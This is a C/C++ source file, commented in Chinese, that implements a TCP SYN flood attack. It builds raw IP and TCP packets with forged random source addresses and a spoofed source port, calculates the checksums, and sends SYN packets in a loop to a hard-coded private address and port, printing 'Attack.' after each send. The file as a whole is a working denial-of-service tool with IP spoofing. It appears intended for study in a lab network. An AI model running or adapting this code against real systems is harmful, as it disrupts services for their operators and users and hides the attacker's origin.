
#include <sys/socket.h>    
#include <sys/types.h>      
#include <netinet/in.h>    
#include <netinet/tcp.h>    
#include <netinet/ip.h>     
#include <arpa/inet.h>      
#include <net/if.h>       
#include <memory.h>
#include <unistd.h>
#include <cstdio>
#include <time.h>
#include <cstdlib>

#define IP_ADDR "10.0.12.8"
#define PORT 1574

u_int16_t check_sum(u_int16_t *buffer, int size){
    register int len = size;
    register u_int16_t *p = buffer;
    register u_int32_t sum = 0;
    while(len >= 2){
        sum += *(p++)&0x0000ffff;
        len -= 2;
    }
    //最后的单字节直接求和
    if(len == 1){
        sum += *((u_int8_t *)p);
    }
    //高16bit与低16bit求和, 直到高16bit为0
    while((sum&0xffff0000) != 0){
        sum = (sum>>16) + (sum&0x0000ffff);
    }
    return (u_int16_t)(~sum);
}

int main(){
    srand(time(NULL));
    // 攻击次数
    int attack_num = 100;
    int socket_fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    int on = 1;
    int opt = setsockopt(socket_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    // 创建sendto需要的对方地址结构信息
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(IP_ADDR);
    addr.sin_port = htons(PORT);
    unsigned int len = sizeof(struct ip)+sizeof(struct tcphdr);
    unsigned char buffer[len];
    memset(&buffer,0,sizeof(buffer));
    struct ip *ip;
    struct tcphdr *tcp;
    ip = (struct ip *)buffer;
    tcp = (struct tcphdr *)(buffer+sizeof(struct ip));

    /*封装ip首部*/
    // 版本 4
    ip->ip_v = IPVERSION;
    // 首部长度 4
    ip->ip_hl = sizeof(struct ip)>>2;
    // 服务类型(types of service) 8
    ip->ip_tos = 0;
    // 总长度 16
    ip->ip_len = htons(len);
    // 标识 16
    ip->ip_id = 0;
    // 标志+偏移 16
    ip->ip_off = 0;
    // 生存时间 8
    ip->ip_ttl = 0;
    // 协议 8
    ip->ip_p = IPPROTO_TCP;
    // 首部检验和 16
    ip->ip_sum = 0;
    // 源地址32 ，在syn攻击的时候伪造地址，这里先注释
    // ip->ip_src.s_addr = inet_addr("127.0.0.1");
    // 目的地址 32
    ip->ip_dst = addr.sin_addr;
    /*封装tcp首部*/
    // 源端口 16 ，在syn攻击的时候伪造源端口，这里先注释
    // tcp->source = htons(m_port);
    // 目的端口 16
    tcp->dest = addr.sin_port;
    // 序号 32
    tcp->seq = 0;
    // 确认号 32
    tcp->ack_seq = 0;
    // 数据偏移 4
    // tcp->res1 = 0;
    // 保留 4
    tcp->doff = 5;  //这里从wireshark来看是指的是数据偏移，resl和doff的位置反了，不知道是头文件有问题还是什么的，应该不是大小端问题。
    // flag 将SYN标志设为1
    tcp->syn = 1;
    // 窗口 16
    // tcp->window = 0;
    // 检验和 16 ，这里需要我们自己计算校验和
    tcp->check = 0;
    // 紧急指针 16
    // tcp->urg_ptr = 0;
    u_int32_t m_ip = rand();
    ip->ip_src.s_addr = htonl(m_ip);
    // 伪造源端口8888
    tcp->source = htons(8888);

    /*synFlood*/
    for(unsigned int i = 0 ; i < attack_num ; i++){
        // 伪造ip源地址
        u_int32_t m_ip = rand();
        ip->ip_src.s_addr = htonl(m_ip);
        /*计算tcp校验和*/
        ip->ip_ttl = 0;
        tcp->check = 0;
        // ip首部的校验和，内核会自动计算，可先作为伪首部，存放tcp长度，然后计算tcp校验和
        ip->ip_sum = htons(sizeof(tcphdr));
        // 计算tcp校验和，从伪首部开始，接着就是tcp首部，然后数据部分，当然我们这里没有数据，直接到tcp首部结尾即可。
    //     利用IP头部构造出一个伪头部。
        tcp->check = check_sum((u_int16_t *)buffer + 4,sizeof(buffer) - 8);
        ip->ip_ttl = MAXTTL;
        // 发送
        int res = sendto(socket_fd, buffer, len, 0, (sockaddr *)&addr, sizeof(sockaddr_in)) ;
        if(res < 0){
            printf("Send packet error.\n");
            exit(0);
        }
        printf("Attack.\n");
        sleep(1);
    }
}